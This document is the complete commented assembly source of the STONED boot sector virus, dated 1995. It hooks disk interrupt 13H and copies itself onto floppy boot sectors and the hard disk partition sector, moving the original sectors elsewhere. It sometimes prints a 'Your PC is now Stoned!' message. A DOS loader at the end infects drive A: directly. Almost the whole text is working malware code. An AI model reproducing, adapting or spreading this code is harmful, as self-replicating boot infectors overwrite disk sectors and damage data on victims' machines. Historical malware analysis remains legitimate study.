;The STONED virus!
;(C) 1995 American Eagle Publications, Inc. All Rights Reserved!

int13_Off       EQU     0004CH                  ;interrupt 13H location
int13_Seg       EQU     0004EH

.model  small
.code

;The following three definitions are BIOS data that are used by the virus

                ORG     413H
MEM_SIZE        DW      ?                       ;memory size in kilobytes

                ORG     43FH
MOTOR_STATUS    DB      ?                       ;floppy disk motor status

                ORG     46CH
TIMER           DD      ?                       ;PC 55ms timer count

;*****************************************************************************

                ORG     0

;This is the STONED boot sector virus. The jump instructions here just go
;past the data area and the viral interrupt 13H handler. The first, far jump
;adjusts cs so that the virus will work properly with a starting offset of 0,
;rather than 7C00, which is normal fo ra boot sector. The first four
;bytes of this code, EA 05 00 0C, also serve the virus to identify itself
;on a floppy disk or the hard disk.

START1:         DB      0EAH,5,0,0C0H,7         ;JMP FAR PTR START2
START2:         JMP     NEAR PTR START3         ;go to startup routine

;*****************************************************************************

;Data area for the virus

DRIVE_NO        DB      0                       ;Drive being booted: 0=floppy, 2=hd
OLD_INT13       DW      0,0                     ;BIOS int 13 handler seg:offs
HIMEM_JMP       DW      OFFSET HIMEM,0          ;Jump to this @ in high memory
BOOT_SEC_START  DW      7C00H,0                 ;Boot sector boot @ seg:offs

;*****************************************************************************

;This is the viral interrupt 13H handler. It simply looks for attempts to
;read or write to the floppy disk. Any reads or writes to the floppy get
;trapped and the INFECT_FLOPPY routine is first called.

INT_13H:        PUSH    DS                      ;Viral int 13H handler
                PUSH    AX
                CMP     AH,2                    ;Look for functions 2 & 3
                JB      GOTO_BIOS               ;else go to BIOS int 13 handler
                CMP     AH,4
                JNB     GOTO_BIOS
                OR      DL,DL                   ;are we reading disk 0?
                JNE     GOTO_BIOS               ;no, go to BIOS int 13 handler
                XOR     AX,AX                   ;yes, activate virus now
                MOV     DS,AX                   ;set ds=0
                MOV     AL,DS:[MOTOR_STATUS]    ;disk motor status
                TEST    AL,1                    ;is motor on drive 0 running?
                JNZ     GOTO_BIOS               ;yes, let BIOS handle it
                CALL    INFECT_FLOPPY           ;go infect the floppy disk in A
GOTO_BIOS:      POP     AX                      ;restore ax and ds
                POP     DS                      ;and let BIOS do the read/write
                JMP     DWORD PTR CS:[OLD_INT13];Jump to old int 13

;*****************************************************************************

;This routine infects the floppy in the A drive. It first checks the floppy to
;make sure it is not already infected, by reading the boot sector from it into
;memory, and comparing the first four bytes with the first four bytes of the
;viral boot sector, which is already in memory. If they are not the same,
;the infection routine rewrites the original boot sector to Cyl 0, Hd 1, Sec 3
;which is the last sector in the root directory. As long as the root directory
;has less than __ entries in it, there is no problem in doing this. Then,
;the virus writes itself to Cyl 0, Hd 0, Sec 1, the actual boot sector.

INFECT_FLOPPY:
                PUSH    BX                      ;save everything
                PUSH    CX
                PUSH    DX
                PUSH    ES
                PUSH    SI
                PUSH    DI
                MOV     SI,4                    ;retry counter
READ_LOOP:      MOV     AX,201H                 ;read boot sector from floppy
                PUSH    CS
                POP     ES                      ;es=cs (here)
                MOV     BX,200H                 ;read to buffer at end of virus
                XOR     CX,CX                   ;dx=cx=0
                MOV     DX,CX                   ;read Cyl 0, Hd 0, Sec 1,
                INC     CX                      ;the floppy boot sector
                PUSHF                           ;fake an int 13H with push/call
                CALL    DWORD PTR CS:[OLD_INT13]
                JNC     CHECK_BOOT_SEC          ;if no error go check bs out
                XOR     AX,AX                   ;error, attempt disk reset
                PUSHF                           ;fake an int 13H again
                CALL    DWORD PTR CS:[OLD_INT13]
                DEC     SI                      ;decrement retry counter
                JNZ     READ_LOOP               ;and try again if counter ok
                JMP     SHORT EXIT_INFECT       ;read failed, get out
                NOP

;Here we determine if the boot sector from the floppy is already infected
CHECK_BOOT_SEC: XOR     SI,SI                   ;si points to the virus in ram
                MOV     DI,200H                 ;di points to bs in question
                CLD
                PUSH    CS                      ;ds=cs
                POP     DS
                LODSW                           ;compare first four bytes of
                CMP     AX,[DI]                 ;the virus to see if the same
                JNE     WRITE_VIRUS             ;no, go put the virus on floppy
                LODSW
                CMP     AX,[DI+2]
                JE      EXIT_INFECT             ;the same, already infected
WRITE_VIRUS:    MOV     AX,301H                 ;write virus to floppy A:
                MOV     BX,200H                 ;first put orig boot sec
                MOV     CL,3                    ;to Cyl 0, Hd 1, Sec 3
                MOV     DH,1                    ;this is the last sector in the
                PUSHF                           ;root directory
                CALL    DWORD PTR CS:[OLD_INT13]      ;fake int 13
                JC      EXIT_INFECT             ;if an error, just get out
                MOV     AX,301H                 ;else write viral boot sec
                XOR     BX,BX                   ;to Cyl 0, Hd 0, Sec 1
                MOV     CL,1                    ;from right here in RAM
                XOR     DX,DX
                PUSHF                           ;fake an int 13 to ROM BIOS
                CALL    DWORD PTR CS:[OLD_INT13]
EXIT_INFECT:    POP     DI                      ;exit the infect routine
                POP     SI                      ;restore everything
                POP     ES
                POP     DX
                POP     CX
                POP     BX
                RET


;*****************************************************************************
;This is the start-up code for the viral boot sector, which is executed when
;the system boots up.

START3:         XOR     AX,AX                   ;Stoned boot sector start-up
                MOV     DS,AX                   ;set ds=ss=0
                CLI                             ;ints off for stack change
                MOV     SS,AX
                MOV     SP,7C00H                ;initialize stack to 0000:7C00
                STI
                MOV     AX,WORD PTR ds:[int13_Off] ;get current int 13H vector
                MOV     DS:[OLD_INT13+7C00H],AX  ;and save it here
                MOV     AX,WORD PTR ds:[int13_Seg]
                MOV     DS:[OLD_INT13+7C02H],AX
                MOV     AX,DS:[MEM_SIZE]        ;get memory size in 1K blocks
                DEC     AX                      ;subtract 2K from it
                DEC     AX
                MOV     DS:[MEM_SIZE],AX        ;save it back
                MOV     CL,6                    ;Convert mem size to segment
                SHL     AX,CL                   ;value
                MOV     ES,AX                   ;and put it in es
                MOV     DS:[HIMEM_JMP+7C02H],AX ;save segment here
                MOV     AX,OFFSET INT_13H       ;now hook interrupt 13H
                MOV     WORD PTR ds:[int13_Off],AX ;into high memory
                MOV     WORD PTR ds:[int13_Seg],ES
                MOV     CX,OFFSET END_VIRUS     ;move this much to hi mem
                PUSH    CS
                POP     DS                      ;cs=7C0H from far jmp at start
                XOR     SI,SI                   ;si=di=0
                MOV     DI,SI
                CLD
                REP     MOVSB                   ;move virus to high memory
                JMP     DWORD PTR CS:[HIMEM_JMP];and go

HIMEM:                                          ;here in high memory
                MOV     AX,0                    ;reset disk drive
                INT     13H
                XOR     AX,AX
                MOV     ES,AX                   ;es=0
                MOV     AX,201H                 ;prep to load orig boot sector
                MOV     BX,7C00H
                CMP     BYTE PTR CS:[DRIVE_NO],0;which drive booting from
                JE      FLOPPY_BOOT             ;ok, booting from floppy, do it
HARD_BOOT:
                MOV     CX,7                    ;else booting from hard disk
                MOV     DX,80H                  ;Read Cyl 0, Hd 0, Sec 7
                INT     13H                     ;where orig part sec is stored
                JMP     GO_BOOT                 ;and jump to it

FLOPPY_BOOT:    MOV     CX,3                    ;Booting from floppy
                MOV     DX,100H                 ;Read Cyl 0, Hd 1, Sec 3
                INT     13H                     ;where orig boot sec is
                JC      GO_BOOT                 ;if an error go to trash!!
                TEST    BYTE PTR ES:[TIMER],7   ;message display one in 8
                JNZ     MESSAGE_DONE            ;times, else none
                MOV     SI,OFFSET STONED_MSG1   ;play the message
                PUSH    CS
                POP     DS                      ;ds=cs
MSG_LOOP:       LODSB                           ;get a byte to al
                OR      AL,AL                   ;al=0?
                JZ      MESSAGE_DONE            ;yes, all done
                MOV     AH,0EH                  ;display byte using BIOS
                MOV     BH,0
                INT     10H
                JMP     SHORT MSG_LOOP          ;and go get another

MESSAGE_DONE:   PUSH    CS
                POP     ES                      ;es=cs
                MOV     AX,201H                 ;Attempt to read hard disk BS
                MOV     BX,200H                 ;to infect it if it hasn't been
                MOV     CL,1
                MOV     DX,80H
                INT     13H
                JC      GO_BOOT                 ;try boot if error reading
                PUSH    CS
                POP     DS                      ;check 1st 4 bytes of HD BS
                MOV     SI,200H                 ;to see if it's infected yet
                MOV     DI,0
                LODSW
                CMP     AX,[DI]                 ;check 2 bytes
                JNE     INFECT_HARD_DISK        ;not the same, go infect HD
                LODSW
                CMP     AX,[DI+2]               ;check next 2 bytes
                JNE     INFECT_HARD_DISK        ;not the same, go infect HD

GO_BOOT:        MOV     CS:[DRIVE_NO],0         ;zero this for floppy infects
                JMP     DWORD PTR CS:[BOOT_SEC_START]     ;jump to 0000:7C00

INFECT_HARD_DISK:
                MOV     CS:[DRIVE_NO],2         ;flag to indicate bs on HD
                MOV     AX,301H                 ;write orig part sec here
                MOV     BX,200H                 ;(Cyl 0, Hd 0, Sec 7)
                MOV     CX,7
                MOV     DX,80H
                INT     13H
                JC      GO_BOOT                 ;error, abort
                PUSH    CS
                POP     DS
                PUSH    CS
                POP     ES                      ;ds=cs=es=high memory
                MOV     SI,OFFSET PART_TABLE + 200H
                MOV     DI,OFFSET PART_TABLE    ;move partition tbl into
                MOV     CX,242H                 ;viral boot sector
                REP     MOVSB                   ;242H move clears orig bs in ram
                MOV     AX,0301H                ;write it to the partition BS
                XOR     BX,BX                   ;at Cyl 0, Hd 0, Sec 1
                INC     CL
                INT     13H
                JMP     SHORT GO_BOOT           ;and jump to original boot sec

;*****************************************************************************

;Messages and blank space

STONED_MSG1     DB      7,'Your PC is now Stoned!',7,0DH,0AH,0AH,0
STONED_MSG2     DB      'LEGALISE MARIJUANA!'

END_VIRUS:                                      ;end of the virus

                DB      0,0,0,0,0,0             ;blank space, not used

PART_TABLE:                                     ;space for HD partition table
                DB      16 dup (0)              ;partition 1 entry
                DB      16 dup (0)              ;partition 2 entry
                DB      16 dup (0)              ;partition 3 entry
                DB      16 dup (0)              ;partition 4 entry


                DB      0,0                     ;usually 55 AA boot sec ID

;*****************************************************************************
;This is the virus loader. When executed from DOS, this is the routine that
;gets called, and it simply infects drive A: with the Stoned virus.
LOADER:
        push    cs                      ;set ds=es=cs
        pop     es
        push    cs
        pop     ds

        mov     ax,201H                 ;read boot sector
        mov     bx,OFFSET BUF           ;into a buffer
        mov     cx,1
        mov     dx,0
        int     13H
        jnc     LOAD1
        mov     ax,201H                 ;do it twice to compensate for
        int     13H                     ;disk change

LOAD1:  mov     ax,301H                 ;write original boot sector to disk
        mov     cx,3
        mov     dx,100H
        int     13H

        mov     ax,301H                 ;and write virus to boot sector
        mov     bx,0
        mov     cx,1
        mov     dx,0
        int     13H

        mov     ax,4C00H                ;then exit to DOS
        int     21H

BUF     db      512 dup (?)             ;buffer for disk reads/writes

.stack          ;leave room for a stack in an EXE file

                END     LOADER


